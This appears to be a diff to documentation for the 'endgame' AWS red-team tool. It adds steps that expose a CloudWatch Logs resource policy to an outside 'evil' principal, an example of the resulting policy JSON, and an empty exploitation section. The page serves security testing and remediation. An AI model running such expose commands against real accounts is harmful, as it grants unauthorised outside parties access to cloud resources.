@@ -4,9 +4,41 @@ CloudWatch Resource Policies allow other AWS services or IAM Principals to put l
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service cloudwatch --name test-resource-exposure
+```
+
+* To view the contents of the exposed resource policy, run the following:
+
+```bash
+aws logs describe-resource-policies
+```
+
+* Observe that the contents of the exposed resource policy match the example shown below.
+
 ## Example
 
+```json
+{
+    "resourcePolicies": [
+        {
+            "policyName": "test-resource-exposure",
+            "policyDocument": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"},\"Action\":[\"logs:PutLogEventsBatch\",\"logs:PutLogEvents\",\"logs:CreateLogStream\"],\"Resource\":\"arn:aws:logs:*\"}]}",
+            "lastUpdatedTime": 1613244111319
+        }
+    ]
+}
+```
+
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 
@@ -26,3 +58,4 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 * [CloudWatch Logs Resource Policies](https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/iam-access-control-overview-cwl.html)
 * [API Documentation: PutResourcePolicy](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_PutResourcePolicy.html)
 * [aws logs put-resource-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/logs/put-resource-policy.html)
+* [aws logs describe-resource-policy](https://docs.aws.amazon.com/cli/latest/reference/logs/describe-resource-policies.html)
